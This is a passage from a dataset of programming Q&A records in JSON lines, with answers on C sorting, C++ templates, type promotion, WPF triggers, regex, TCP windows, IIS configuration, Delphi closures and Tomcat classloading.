\n\"85861560789112949495459501737958331952853208805511\"  \n\"12540698747158523863050715693290963295227443043557\" \n\"66896648950445244523161731856403098711121722383113\" \n\"62229893423380308135336276614282806444486645238749\" \n\"30358907296290491560440772390713810515859307960866\" \n\"70172427121883998797908792274921901699720888093776\" \n\"65727333001053367881220235421809751254540594752243\"  \n\"52584907711670556013604839586446706324415722155397\" \n\"53697817977846174064955149290862569321978468622482\" \n\"83972241375657056057490261407972968652414535100474\" \n\"82166370484403199890008895243450658541227588666881\" \n\"16427171479924442928230863465674813919123162824586\"  \n\"17866458359124566529476545682848912883142607690042\"\n\"24219022671055626321111109370544217506941658960408\" \n\"07198403850962455444362981230987879927244284909188\" \n\"84580156166097919133875499200524063689912560717606\" \n\"05886116467109405077541002256983155200055935729725\"     \n\"71636269561882670428252483600823257530420752963450\"\n\nNote however that even in C# it doesn't do what it sounds like you want. If you have:\nstring foo = @\"x\ny\";\n\nin C# then the string will actually contain a linebreak.\nIn C++11, as per the comment, the R prefix denotes a raw string literal, e.g.\nstring x = R\"(First line\nsecond line)\";\n\n", "score": 18}
{"title": "A good reference card / cheat sheet with the basic sort algorithms in C?", "description": "I've been looking (without great luck) for the perfect reference card with all the basic sorting algos in C (or maybe in pseudo code). Wikipedia is a terrific source of info but this time I'm looking for something definitely more portable (pocket size if possible) and of course printable. Any suggestion would be much appreciated!\n", "answer": "I made this for a friend of mine studying C, maybe you will find it helpful:\n#include <stdlib.h>\n#include <string.h>\n\nstatic void swap(int *a, int *b) {\n    if (a != b) {\n        int c = *a;\n        *a = *b;\n        *b = c;\n    }\n}\n\nvoid bubblesort(int *a, int l) {\n    int i, j;\n\n    for (i = l - 2; i >= 0; i--)\n        for (j = i; j < l - 1 && a[j] > a[j + 1]; j++)\n            swap(a + j, a + j + 1);\n}\n\nvoid selectionsort(int *a, int l) {\n    int i, j, k;\n    for (i = 0; i < l; i++) {\n        for (j = (k = i) + 1; j < l; j++)\n            if (a[j] < a[k])\n                k = j;\n        swap(a + i, a + k);\n    }\n}\n\nstatic void hsort_helper(int *a, int i, int l) {\n    int j;\n\n    for (j = 2 * i + 1; j < l; i = j, j = 2 * j + 1)\n        if (a[i] < a[j])\n            if (j + 1 < l && a[j] < a[j + 1])\n                swap(a + i, a + ++j);\n            else\n                swap(a + i, a + j);\n        else if (j + 1 < l && a[i] < a[j + 1])\n            swap(a + i, a + ++j);\n        else\n            break;\n}\n\nvoid heapsort(int *a, int l) {\n    int i;\n\n    for (i = (l - 2) / 2; i >= 0; i--)\n        hsort_helper(a, i, l);\n\n    while (l-- > 0) {\n        swap(a, a + l);\n        hsort_helper(a, 0, l);\n    }\n}\n\nstatic void msort_helper(int *a, int *b, int l) {\n    int i, j, k, m;\n\n    switch (l) {\n        case 1:\n            a[0] = b[0];\n        case 0:\n            return;\n    }\n\n    m = l / 2;\n    msort_helper(b, a, m);\n    msort_helper(b + m, a + m, l - m);\n    for (i = 0, j = 0, k = m; i < l; i++)\n        a[i] = b[j < m && !(k < l && b[j] > b[k]) ? j++ : k++];\n}\n\nvoid mergesort(int *a, int l) {\n    int *b;\n\n    if (l < 0)\n        return;\n\n    b = malloc(l * sizeof(int));\n    memcpy(b, a, l * sizeof(int));\n    msort_helper(a, b, l);\n    free(b);\n}\n\nstatic int pivot(int *a, int l) {\n    int i, j;\n\n    for (i = j = 1; i < l; i++)\n        if (a[i] <= a[0])\n            swap(a + i, a + j++);\n\n    swap(a, a + j - 1);\n\n    return j;\n}\n\nvoid quicksort(int *a, int l) {\n    int m;\n\n    if (l <= 1)\n        return;\n\n    m = pivot(a, l);\n    quicksort(a, m - 1);\n    quicksort(a + m, l - m);\n}\n\nstruct node {\n    int value;\n    struct node *left, *right;\n};\n\nvoid btreesort(int *a, int l) {\n    int i;\n    struct node *root = NULL, **ptr;\n\n    for (i = 0; i < l; i++) {\n        for (ptr = &root; *ptr;)\n            ptr = a[i] < (*ptr)->value ? &(*ptr)->left : &(*ptr)->right;\n        *ptr = malloc(sizeof(struct node));\n        **ptr = (struct node){.value = a[i]};\n    }\n\n    for (i = 0; i < l; i++) {\n        struct node *node;\n        for (ptr = &root; (*ptr)->left; ptr = &(*ptr)->left);\n        a[i] = (*ptr)->value;\n        node = (*ptr)->right;\n        free(*ptr);\n        (*ptr) = node;\n    }\n}\n\n", "score": 43}
{"title": "Where do you find templates useful?", "description": "At my workplace, we tend to use  iostream, string, vector, map, and the odd algorithm or two.  We haven't actually found many situations where template techniques were a best solution to a problem.\nWhat I am looking for here are ideas, and optionally sample code that shows how you used a template technique to create a new solution to a problem that you encountered in real life.\nAs a bribe, expect an up vote for your answer.\n", "answer": "General info on templates:\nTemplates are useful anytime you need to use the same code but operating on different data types, where the types are known at compile time.   And also when you have any kind of container object.\nA very common usage is for just about every type of data structure.  For example: Singly linked lists, doubly linked lists, trees, tries, hashtables, ...\nAnother very common usage is for sorting algorithms.\nOne of the main advantages of using templates is that you can remove code duplication.  Code duplication is one of the biggest things you should avoid when programming.\nYou could implement a function Max as both a macro or a template, but the template implementation would be type safe and therefore better. \nAnd now onto the cool stuff:\nAlso see template metaprogramming, which is a way of pre-evaluating code at compile-time rather than at run-time.  Template metaprogramming has only immutable variables, and therefore its variables cannot change.  Because of this template metaprogramming can be seen as a type of functional programming. \nCheck out this example of template metaprogramming from Wikipedia.  It shows how templates can be used to execute code at compile time.  Therefore at runtime you have a pre-calculated constant.\ntemplate <int N>\nstruct Factorial \n{\n    enum { value = N * Factorial<N - 1>::value };\n};\n\ntemplate <>\nstruct Factorial<0> \n{\n    enum { value = 1 };\n};\n\n// Factorial<4>::value == 24\n// Factorial<0>::value == 1\nvoid foo()\n{\n    int x = Factorial<4>::value; // == 24\n    int y = Factorial<0>::value; // == 1\n}\n\n", "score": 12}
{"title": "Which variables should I typecast when doing math operations in C/C++?", "description": "For example, when I'm dividing two ints and want a float returned, I superstitiously write something like this:\nint a = 2, b = 3;\nfloat c = (float)a / (float)b;\n\nIf I do not cast a and b to floats, it'll do integer division and return an int.\nSimilarly, if I want to multiply a signed 8-bit number with an unsigned 8-bit number, I will cast them to signed 16-bit numbers before multiplying for fear of overflow:\nu8 a = 255;\ns8 b = -127;\ns16 = (s16)a * (s16)b;\n\nHow exactly does the compiler behave in these situations when not casting at all or when only casting one of the variables? Do I really need to explicitly cast all of the variables, or just the one on the left, or the one on the right?\n", "answer": "Question 1: Float division\nint a = 2, b = 3;\nfloat c = static_cast<float>(a) / b;  // need to convert 1 operand to a float\n\nQuestion 2: How the compiler works\nFive rules of thumb to remember:\n\nArithmetic operations are always performed on values of the same type.\nThe result type is the same as the operands (after promotion)\nThe smallest type arithmetic operations are performed on is int.\nANSCI C (and thus C++) use value preserving integer promotion.\nEach operation is done in isolation.\n\nThe ANSI C rules are as follows:\nMost of these rules also apply to C++ though not all types are officially supported (yet).\n\nIf either operand is a long double the other is converted to a long double.\nIf either operand is a double the other is converted to a double.\nIf either operand is a float the other is converted to a float.\nIf either operand is a unsigned long long the other is converted to unsigned long long.\nIf either operand is a long long the other is converted to long long.\nIf either operand is a unsigned long the other is converted to unsigned long.\nIf either operand is a long the other is converted to long.\nIf either operand is a unsigned int the other is converted to unsigned int.\nOtherwise both operands are converted to int.\n\nOverflow\nOverflow is always a problem. Note. The type of the result is the same as the input operands so all the operations can overflow, so yes you do need to worry about it (though the language does not provide any explicit way to catch this happening.\nAs a side note:\nUnsigned division can not overflow but signed division can.\nstd::numeric_limits<int>::max() / -1  // No Overflow\nstd::numeric_limits<int>::min() / -1  // Will Overflow\n\n", "score": 28}
{"title": "WPF Trigger for IsSelected in a DataTemplate for ListBox items", "description": "I have a listbox, and I have the following ItemTemplate for it:\n<DataTemplate x:Key=\"ScenarioItemTemplate\">\n    <Border Margin=\"5,0,5,0\"\n            Background=\"#FF3C3B3B\"\n            BorderBrush=\"#FF797878\"\n            BorderThickness=\"2\"\n            CornerRadius=\"5\">\n        <DockPanel>\n            <DockPanel DockPanel.Dock=\"Top\"\n                       Margin=\"0,2,0,0\">\n                <Button HorizontalAlignment=\"Left\"\n                        DockPanel.Dock=\"Left\"\n                        FontWeight=\"Heavy\"\n                        Foreground=\"White\" />\n                <Label Content=\"{Binding Path=Name}\"\n                       DockPanel.Dock=\"Left\"\n                       FontWeight=\"Heavy\"\n                       Foreground=\"white\" />\n                <Label HorizontalAlignment=\"Right\"\n                       Background=\"#FF3C3B3B\"\n                       Content=\"X\"\n                       DockPanel.Dock=\"Left\"\n                       FontWeight=\"Heavy\"\n                       Foreground=\"White\" />\n            </DockPanel>\n            <ContentControl Name=\"designerContent\"\n                            Visibility=\"Collapsed\"\n                            MinHeight=\"100\"\n                            Margin=\"2,0,2,2\"\n                            Content=\"{Binding Path=DesignerInstance}\"\n                            Background=\"#FF999898\">\n            </ContentControl>\n        </DockPanel>\n    </Border>\n</DataTemplate>\n\nAs you can see the ContentControl has Visibility set to collapsed.\nI need to define a trigger that causes the Visibility to be set to \"Visible\"\nwhen the ListItem is selected, but I can't figure it out.\nAny ideas? \nUPDATE: Of course I could simply duplicate the DataTemplate and add triggers\nto the ListBox in question to use either one or the other, but I want to prevent duplicating this code.\n", "answer": "You can style your ContentControl such that a trigger fires when its container (the ListBoxItem) becomes selected:\n<ContentControl \n    x:Name=\"designerContent\"\n    MinHeight=\"100\"\n    Margin=\"2,0,2,2\"\n    Content=\"{Binding Path=DesignerInstance}\"\n    Background=\"#FF999898\">\n    <ContentControl.Style>\n        <Style TargetType=\"{x:Type ContentControl}\">\n            <Setter Property=\"Visibility\" Value=\"Collapsed\"/>\n            <Style.Triggers>\n                <DataTrigger\n                        Binding=\"{Binding\n                            RelativeSource={RelativeSource\n                                Mode=FindAncestor,\n                                AncestorType={x:Type ListBoxItem}},\n                                Path=IsSelected}\"\n                        Value=\"True\">\n                    <Setter Property=\"Visibility\" Value=\"Visible\"/>\n                </DataTrigger>\n            </Style.Triggers>\n        </Style>\n    </ContentControl.Style>\n</ContentControl>\n\nAlternatively, I think you can add the trigger to the template itself and reference the control by name. I don't know this technique well enough to type it from memory and assume it'll work, but it's something like this:\n<DataTemplate x:Key=\"ScenarioItemTemplate\">\n    <DataTemplate.Triggers>\n        <DataTrigger\n                Binding=\"{Binding\n                    RelativeSource={RelativeSource\n                        Mode=FindAncestor,\n                        AncestorType={x:Type ListBoxItem}},\n                        Path=IsSelected}\"\n                Value=\"True\">\n            <Setter\n                TargetName=\"designerContent\"\n                Property=\"Visibility\"\n                Value=\"Visible\"/>\n        </DataTrigger>\n    </DataTemplate.Triggers>\n\n    ...\n</DataTemplate>\n\n", "score": 127}
{"title": "Regex to match sloppy fractions / mixed numbers", "description": "I have a series of text that contains mixed numbers (ie: a whole part and a fractional part). The problem is that the text is full of human-coded sloppiness:\n\nThe whole part may or may not exist (ex: \"10\")\nThe fractional part may or may not exist (ex: \"1/3\")\nThe two parts may be separated by spaces and/or a hyphens (ex: \"10 1/3\", \"10-1/3\", \"10 - 1/3\").\nThe fraction itself may or may not have spaces between the number and the slash (ex: \"1 /3\", \"1/ 3\", \"1 / 3\").\nThere may be other text after the fraction that needs to be ignored\n\nI need a regex that can parse these elements so that I can create a proper number out of this mess.\n", "answer": "Here's a regex that will handle all of the data I can throw at it:\n(\\d++(?! */))? *-? *(?:(\\d+) */ *(\\d+))?.*$\n\nThis will put the digits into the following groups:\n\nThe whole part of the mixed number, if it exists\nThe numerator, if a fraction exits\nThe denominator, if a fraction exists\n\nAlso, here's the RegexBuddy explanation for the elements (which helped me immensely when constructing it):\nMatch the regular expression below and capture its match into backreference number 1 «(\\d++(?! */))?»\n   Between zero and one times, as many times as possible, giving back as needed (greedy) «?»\n   Match a single digit 0..9 «\\d++»\n      Between one and unlimited times, as many times as possible, without giving back (possessive) «++»\n   Assert that it is impossible to match the regex below starting at this position (negative lookahead) «(?! */)»\n      Match the character “ ” literally « *»\n         Between zero and unlimited times, as many times as possible, giving back as needed (greedy) «*»\n      Match the character “/” literally «/»\nMatch the character “ ” literally « *»\n   Between zero and unlimited times, as many times as possible, giving back as needed (greedy) «*»\nMatch the character “-” literally «-?»\n   Between zero and one times, as many times as possible, giving back as needed (greedy) «?»\nMatch the character “ ” literally « *»\n   Between zero and unlimited times, as many times as possible, giving back as needed (greedy) «*»\nMatch the regular expression below «(?:(\\d+) */ *(\\d+))?»\n   Between zero and one times, as many times as possible, giving back as needed (greedy) «?»\n   Match the regular expression below and capture its match into backreference number 2 «(\\d+)»\n      Match a single digit 0..9 «\\d+»\n         Between one and unlimited times, as many times as possible, giving back as needed (greedy) «+»\n   Match the character “ ” literally « *»\n      Between zero and unlimited times, as many times as possible, giving back as needed (greedy) «*»\n   Match the character “/” literally «/»\n   Match the character “ ” literally « *»\n      Between zero and unlimited times, as many times as possible, giving back as needed (greedy) «*»\n   Match the regular expression below and capture its match into backreference number 3 «(\\d+)»\n      Match a single digit 0..9 «\\d+»\n         Between one and unlimited times, as many times as possible, giving back as needed (greedy) «+»\nMatch any single character that is not a line break character «.*»\n   Between zero and unlimited times, as many times as possible, giving back as needed (greedy) «*»\nAssert position at the end of the string (or before the line break at the end of the string, if any) «$»\n\n", "score": 11}
{"title": "Converting floating point to fixed point", "description": "In C++, what's the generic way to convert any floating point value (float) to fixed point (int, 16:16 or 24:8)?\nEDIT: For clarification, fixed-point values have two parts to them: an integer part and a fractional part.  The integer part can be represented by a signed or unsigned integer data type.  The fractional part is represented by an unsigned data integer data type.\nLet's make an analogy with money for the sake of clarity.  The fractional part may represent cents -- a fractional part of a dollar.  The range of the 'cents' data type would be 0 to 99.  If a 8-bit unsigned integer were to be used for fixed-point math, then the fractional part would be split into 256 evenly divisible parts.\nI hope that clears things up.\n", "answer": "Here you go:\n// A signed fixed-point 16:16 class\nclass FixedPoint_16_16\n{\n    short          intPart;\n    unsigned short fracPart;\n\npublic:\n    FixedPoint_16_16(double d)\n    {\n        *this = d; // calls operator=\n    }\n\n    FixedPoint_16_16& operator=(double d)\n    {\n        intPart = static_cast<short>(d);\n        fracPart = static_cast<unsigned short>\n                    (numeric_limits<unsigned short> + 1.0)*d);\n        return *this;\n    }\n\n    // Other operators can be defined here\n};\n\nEDIT: Here's a more general class based on anothercommon way to deal with fixed-point numbers (and which KPexEA pointed out):\ntemplate <class BaseType, size_t FracDigits>\nclass fixed_point\n{\n    const static BaseType factor = 1 << FracDigits;\n\n    BaseType data;\n\npublic:\n    fixed_point(double d)\n    {\n        *this = d; // calls operator=\n    }\n\n    fixed_point& operator=(double d)\n    {\n        data = static_cast<BaseType>(d*factor);\n        return *this;\n    }\n\n    BaseType raw_data() const\n    {\n        return data;\n    }\n\n    // Other operators can be defined here\n};\n\nfixed_point<int, 8> fp1;           // Will be signed 24:8 (if int is 32-bits)\nfixed_point<unsigned int, 16> fp1; // Will be unsigned 16:16 (if int is 32-bits)\n\n", "score": 31}
{"title": "TCP is it possible to achieve higher transfer rate with multiple connections?", "description": "Is it possible to achieve better data transfer rate with multiple parallel TCP connections in high-latency environment (public internet with large geographical distance assuming no traffic shaping per connection or stuff like that) or can TCP utilize the whole bandwidth with a single connection?\n\nIs TCP sending data as fast as it cans if receiver doesn't report buffer congestion with 0 windows size? So if RTT is for example like 60 seconds it doesn't affect the rate at all? Is there some maximum window size or something else limiting the rate? \n", "answer": "One advantage multiple concurrent connections may give you (subject to the same caveats mentioned by dove and Brian) is you will be able to better overcome the problem of having too small a TCP receive window.\nThe principle this relates to is bandwidth delay product. (There's a more detailed explanation here).\nA brief summary: in high-latency, high-bandwidth environments, reliable communications such as TCP are often limited by the amount of data in flight at any given time. Multiple connections are one way around this, as the bandwidth delay product applies to each connection individually.\nIn more detail, consider the following: you have an end-to-end bandwidth of 10^8 bits per second (10 megabits/second), and a round-trip delay of 100ms (0.1 seconds). Therefore, there can be up to 10^7 bits (10 megabits = ~1.25 megabytes) of data sent before the acknowledgment of the first bit of data has gotten back to the sender.\nThis will vary depending on the TCP stack of your OS, but a not-uncommon value for TCP receive window size is 64Kbytes. This is obviously far too small to allow you to make full use of the end to end bandwidth; once 64kbytes (512kbits) of data have been sent, your sending process will wait for a window update from the receiver indicating that some data has been consumed before putting any more data on the wire.\nHaving multiple TCP sessions open gets around this by virtue of the fact that each TCP session will have its own send/receive buffers.\nOf course, on the internet it's difficult to determine the true available end-to-end bandwidth, due to TCP window size, contention, etc. If you're able to provide some sample figures, we may be able to assist more.\nThe other option you should look into is setting a larger receive window when you create your socket, either globally using an OS setting, or on a per socket basis using socket options.\n", "score": 22}
{"title": "How do you create non scrolling div at the top of an HTML page without two sets of scroll bars", "description": "How do you create non scrolling div that looks like the MS Office 2007 ribbon on a web page without two sets of scroll bars. One for the window and one for the div.\n", "answer": "Try this:\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\">\n<html xmlns=\"http://www.w3.org/1999/xhtml\">\n    <head>\n        <title>Fixed Header/Full Page Content</title>\n        <meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" />\n        <style type=\"text/css\">\n            body,\n            div {\n                margin: 0;\n                padding: 0;\n            }\n\n            body {\n                /* Disable scrollbars and ensure that the body fills the window */\n                overflow: hidden;\n                width: 100%;\n                height: 100%;\n            }\n\n            #header {\n                /* Provide scrollbars if needed and fix the header dimensions */\n                overflow: auto;\n                position: absolute;\n                width: 100%;\n                height: 200px;\n            }\n\n            #main {\n                /* Provide scrollbars if needed, position below header, and derive height from top/bottom */\n                overflow: auto;\n                position: absolute;\n                width: 100%;\n                top: 200px;\n                bottom: 0;\n            }\n        </style>\n    </head>\n    <body>\n        <div id=\"header\">HEADER</div>\n        <div id=\"main\">\n            <p>FIRST</p>\n            <p>MAIN</p>\n            <p>MAIN</p>\n            <p>MAIN</p>\n            <p>MAIN</p>\n            <p>MAIN</p>\n            <p>MAIN</p>\n            <p>MAIN</p>\n            <p>MAIN</p>\n            <p>MAIN</p>\n            <p>MAIN</p>\n            <p>MAIN</p>\n            <p>MAIN</p>\n            <p>MAIN</p>\n            <p>MAIN</p>\n            <p>MAIN</p>\n            <p>MAIN</p>\n            <p>MAIN</p>\n            <p>MAIN</p>\n            <p>MAIN</p>\n            <p>MAIN</p>\n            <p>MAIN</p>\n            <p>MAIN</p>\n            <p>MAIN</p>\n            <p>MAIN</p>\n            <p>MAIN</p>\n            <p>MAIN</p>\n            <p>MAIN</p>\n            <p>MAIN</p>\n            <p>LAST</p>\n        </div>\n<!--[if lt IE 7]>\n        <script type=\"text/javascript\">\n            var elMain = document.getElementById('main');\n\n            setMainDims();\n            document.body.onresize = setMainDims;\n\n            function setMainDims() {\n                elMain.style.height = (document.body.clientHeight - 200) + 'px';\n                elMain.style.width = '99%'\n                setTimeout(\"elMain.style.width = '100%'\", 0);\n            }\n        </script>\n<![endif]-->\n    </body>\n</html>\n\nBasically, what you are doing is removing the scrollbars from the body and applying scrollbars to elements inside the document.  That is simple.  The trick is to get the #main div to size to fill the space below the header.  This is accomplished in most browsers by setting both the top and the bottom positions and leaving the height unset.  The result is that the top of the div is fixed below the header and the bottom of the div will always stretch to the bottom of the screen.\nOf course there is always IE6 there to make sure that we earn our paychecks.  Prior to version 7 IE wouldn't derive dimensions from conflicting absolute positions.  Some people use IE's css expressions to solve this problem for IE6, but these expressions literally evaluate on every mousemove, so I'm simply resizing the #main div on the resize event and hiding that block of javascript from other browsers using a conditional comment.\nThe lines setting the width to 99% and the setTimeout to set it back to 100% fixes a little rendering oddity in IE6 that causes the horizontal scrollbar to appear occasionally when you resize the window.\nNote: You must use a doctype and get IE out of quirks mode.\n", "score": 15}
{"title": "Passing pointers/references to structs into functions", "description": "This is going to sound like a silly question, but I'm still learning C, so please bear with me. :)\nI'm working on chapter 6 of K&R (structs), and thus far through the book have seen great success. I decided to work with structs pretty heavily, and therefore did a lot of work early in the chapter with the point and rect examples. One of the things I wanted to try was changing the canonrect function (2nd Edition, p 131) work via pointers, and hence return void.\nI have this working, but ran into a hiccup I was hoping you guys could help me out with. I wanted canonRect to create a temporary rectangle object, perform its changes, then reassign the pointer it's passed to the temporary rectangle, thus simplifying the code. \nHowever, if I do that, the rect doesn't change. Instead, I find myself manually repopulating the fields of the rect I'm passed in, which does work.\nThe code follows:\n#include <stdio.h>\n\n#define min(a, b) ((a) < (b) ? (a) : (b))\n#define max(a, b) ((a) > (b) ? (a) : (b))\n\nstruct point {\n    int x;\n    int y;\n};\n\nstruct rect {\n    struct point lowerLeft;\n    struct point upperRight;\n};\n\n// canonicalize coordinates of rectangle\nvoid canonRect(struct rect *r);\n\nint main(void) {\n    struct point p1, p2;\n    struct rect r;\n\n    p1.x = 10;\n    p1.y = 10;\n    p2.x = 20;\n    p2.y = 40;\n    r.lowerLeft = p2; // note that I'm inverting my points intentionally\n    r.upperRight = p1;\n\n    printf(\"Rectangle, lower left: %d, %d; upper right: %d %d\\n\\n\", \n        r.lowerLeft.x, r.lowerLeft.y, r.upperRight.x, r.upperRight.y);\n\n    // can't pass a pointer, only a reference. \n    // (Passing pointers results in illegal indirection compile time errors)\n    canonRect(&r); \n    printf(\"Rectangle, lower left: %d, %d; upper right: %d %d\\n\\n\", \n        r.lowerLeft.x, r.lowerLeft.y, r.upperRight.x, r.upperRight.y);    \n}\n\nvoid canonRect(struct rect *r) {\n    struct rect temp;\n    temp.lowerLeft.x = min(r->lowerLeft.x, r->upperRight.x);\n    temp.lowerLeft.y = min(r->lowerLeft.y, r->upperRight.y);\n    temp.upperRight.x = max(r->lowerLeft.x, r->upperRight.x);\n    temp.upperRight.y = max(r->lowerLeft.y, r->upperRight.y);\n\n    r = &temp; // doesn't work; my passed-in rect remains the same\n\n    // I wind up doing the following instead, to reassign all \n    // the members of my passed-in rect\n    //r->lowerLeft = temp.lowerLeft;\n    //r->upperRight = temp.upperRight;\n}\n\nSo here are the questions:\n\nWhy does r = &temp; not work? (I think this is because I pass in a reference instead of a pointer; am I correct in thinking that references are not modifiable but pointers are?)\nWhy might I get an illegal indirection compile-time error if I try to pass in a pointer to canonRect? (IE, if I had canonRect(*r); in main().)\n\nI suspect I already know the answer to #1, but #2 perplexes me -- I thought it was legal to pass pointers around.\nAnyway ... please forgive the C newb.\n", "answer": "I think what you want to do is this:\nvoid canonRect(struct rect *r) {\n    struct rect temp;\n    temp.lowerLeft.x = min(r->lowerLeft.x, r->upperRight.x);\n    temp.lowerLeft.y = min(r->lowerLeft.y, r->upperRight.y);\n    temp.upperRight.x = max(r->lowerLeft.x, r->upperRight.x);\n    temp.upperRight.y = max(r->lowerLeft.y, r->upperRight.y);\n\n    *r = temp; \n}\n\nIn the above code you are setting *r which is of type rect to temp which is of type rect.\nRe 1: If you want to change what r is pointing to you need to use a pointer to a pointer.  If that's really what you want (see above, it is not really what you want) then you'd have to make sure to point it to something on the heap.   If you point it to something not created with 'new' or malloc then it will fall out of scope and you will be pointing to memory that is no longer used for that variable. \nWhy doesn't your code work with r = &temp?\nBecause r is of rect* type.  That means that r is a variable that holds a memory address who's memory contains a rect.  If you change what r is pointing to, that's fine but that doesn't change the passed in variable. \nRe 2: * when not used in a type declaration is the dereference unary operator.  This means that it will lookup what is inside the address of the pointer.  So by passing *r you are not passing a pointer at all.   In face since r is not a pointer, that is invalid syntax. \n", "score": 19}
{"title": "Namespace collisions", "description": "How is it possible that .NET is finding the wrong 'MyType' in this scenario?\nI have a type A.B.C.D.MyType in a project that I'm working on, and I'm referencing a DLL that has a type A.B.MyType? I do not have any 'using A.B;' statements anywhere in my code, and I do have 'using A.B.C.D;'. When I compile, the compiler thinks any naked reference to 'MyType' means 'A.B.MyType'.\nI know I could just rename the class or use an alias, but I'm wondering how this is even possible.\nAny ideas?\nThanks!\n", "answer": "Are you working in a namespace that is under A.B namespace? (for example A.B.X) if so the C# namespace resolutions (ECMA-334 C# Language Specification : 10.8 10.8 Namespace and type names) says:\n\n... for each namespace N, starting\n  with the namespace in which the\n  namespace-or-typename occurs,\n  continuing with each enclosing\n  namespace (if any), and ending with\n  the global namespace, the following\n  steps are evaluated until an entity is\n  located...\n\nand then followed by: \n\nIf K is zero and the namespace\n  declaration contains an\n  extern-alias-directive or\n  using-aliasdirective that associates\n  the name I with an imported namespace\n  or type, then the\n  namespace-or-type-name refers to that\n  namespace or type\n\nThis means that name resolution starts at the current namespace and searches all namespaces up to the root, and only after this hierarchical search ends, then the namespaces imported with the using clause are searched.\nThe following example prints \"Ns1.Foo\"\nusing Ns1.Foo.Foo2;\n\nnamespace Ns1.Foo\n{\n    class Foo\n    {\n        public void Print()\n        {\n            System.Console.WriteLine(\"Ns1.Foo\");\n        }\n    }\n}\n\nnamespace Ns1.Foo.Foo2\n{\n    class Foo\n    {\n        public void Print()\n        {\n            System.Console.WriteLine(\"Ns1.Foo.Foo2\");\n        }\n    }\n}\n\nnamespace Ns1.Foo.Bar\n{\n    class Bar\n    {\n        public void Print()\n        {\n            new Foo().Print();\n        }\n\n        static void Main()\n        {\n            new Bar().Print();\n        }\n    }\n}\n\nEdit: Adding a using clause inside a namespace, will make so that the namespace is searched before the hierarchical search of current namespace is done is done. Change the example to:\nnamespace Ns1.Foo.Bar\n{\n    using Ns1.Foo.Foo2;\n    class Bar\n    {\n        public void Print()\n        {\n            new Foo().Print();\n        }\n\n        static void Main()\n        {\n            new Bar().Print();\n        }\n    }\n}\n\nand Ns1.Foo.Foo2 will be printed.\nEdit: changed example\n", "score": 11}
{"title": "How do you tell IIS 6 to set the .NET version to 2.0 (not 1.1) When New sites are created?", "description": "We create new sites in IIS 6 (Windows Server 2003) using IIS Manager.  When these sites are created in IIS 6, the ASP.NET version defaults to ASP.NET 1.1.  We would like it to default to ASP.NET 2.0.  The reason this is a problem for us is that when you take any site on the server and switch the ASP.NET version from ASP.NET 1.1 to ASP.NET 2.0, all web sites recycle.\nIs there a setting in the IIS metabase that controls this or a way to create a site via script that sets the ASP.Net version correctly so that we can avoid the IIS reset when setting up each site?\n", "answer": "As already mentioned by another, I reference this post whenever I need to change the .NET settings for a site.\nAs for your question, the following steps (summarized from the linked post) should achieve what you need:\n\nRun aspnet_regiis -lk from any .NET framework folder to list your current settings to help you determine which sites should remain using .NET 1.1. If you know there is a .NET 1.1 site, but it is not explicitly listed by this command, then it is inheriting from the root W3SVC/.\nFor all .NET 1.1 sites not explicitly listed by the previous command, you will need to force them to use .NET 1.1:\n\nDetermine the Identifier ID of the site(s) which you want to force to use .NET 1.1. (Through the IIS 6 Manager, you can determine the Identifier of a site by clicking the \"Web Sites\" folder on the left side of the tool. On the right side, all your sites will be listed, and the Identifier column shows the ID.)\nFrom the .NET 1.1 framework folder, run aspnet_regiis -sn W3SVC/<Identifier ID>/ROOT/ where <Identifier ID> is the ID of the site which you want to force to use .NET 1.1. \n\nFinally, change the root W3SVC/ to use .NET 2.0 so that all newly created sites will inherit from the root and default to use .NET 2.0. To change the root, from the .NET 2.0 framework folder, run aspnet_regiis -sn W3SVC/.\n\nYou can run aspnet_regiis -lk again to verify your settings.\n", "score": 11}
{"title": "Can someone explain Anonymous methods to me?", "description": "Delphi 2009, among some cool stuff, has also just got Anonymous methods. I've seen the examples, and the blog posts regarding anonymous methods, but I don't get them yet. Can someone explain why I should be excited?\n", "answer": "Please have a look at closures.\nDelphi anonymous functions are closures. \nThese are created within other functions and as such has access to the scope of that function. This is even so if the anonumous function is assigned to a function parameter that is called after the original function is called. (I will create an example in a moment).\ntype\n  TAnonFunc = reference to procedure;\n  TForm2 = class(TForm)\n    Memo1: TMemo;\n    Button1: TButton;\n    Button2: TButton;\n    Button3: TButton;\n    procedure Button1Click(Sender: TObject);\n    procedure Button2Click(Sender: TObject);\n    procedure Button3Click(Sender: TObject);\n  private\n    F1 : TAnonFunc;\n    F2 : TAnonFunc;\n  end;\n\nprocedure TForm2.Button1Click(Sender: TObject);\nvar\n  a : Integer;\nbegin\n  a := 1;\n\n  F1 := procedure\n  begin\n    a := a + 1;\n  end;\n\n  F2 := procedure\n  begin\n    Memo1.Lines.Add(IntToStr(a));\n  end;\nend;\n\nThe above method assigns two anonymous functions to the fields F1 and F2. The first increases the local variable and the second showe the value of the variable.\nprocedure TForm2.Button2Click(Sender: TObject);\nbegin\n  F1;\nend;\n\nprocedure TForm2.Button3Click(Sender: TObject);\nbegin\n  F2;\nend;\n\nYou can now call both functions, and they access the same a. So calling F1 twice and F2 once shows a 3.\nOf course this is a simple example. But it can be expanded to more usefull code.\nIn the multi threading environment, anonymous functions can be used in a call to Synchronise, which eliminates the need for countless methods.\n", "score": 16}
{"title": "Controlling the classpath in a servlet", "description": "My servlet application includes a number of library .jars, some of which contain embedded log4j.xml or log4j.properties files. I'd like to ensure that log4j finds my log4j.xml first! I've tried searching for some specification of the priorities of the various classpath elements in a servlet (e.g. does WEB-INF/classes always precede WEB-INF/lib?), or some way to configure or tweak the servlet's classloader so that a given resource directory appears early in the classpath. So far, I've drawn a blank. Any suggestions on ensuring that a servlet .war file loads the correct log4j.xml via the classloader?\n", "answer": "Tomcat 8.5\nDitto Tomcat 8.0. \nSee documentation: Class Loader HOW-TO.\nTomcat 8.0\nThe answer is simple, taken from the Tomcat documentation page, Class Loader HOW-TO. In particular notice the use of the /WEB-INF/ directory/folder.\n\nTherefore, from the perspective of a web application, class or resource loading looks in the following repositories, in this order:\n\nBootstrap classes of your JVM\n/WEB-INF/classes of your web application\n/WEB-INF/lib/*.jar of your web application\nSystem class loader classes (described above)\nCommon class loader classes (described above)\n\nIf the web application class loader is configured with <Loader delegate=\"true\"/> then the order becomes:\n\nBootstrap classes of your JVM\nSystem class loader classes (described above)\nCommon class loader classes (described above)\n/WEB-INF/classes of your web application\n/WEB-INF/lib/*.jar of your web 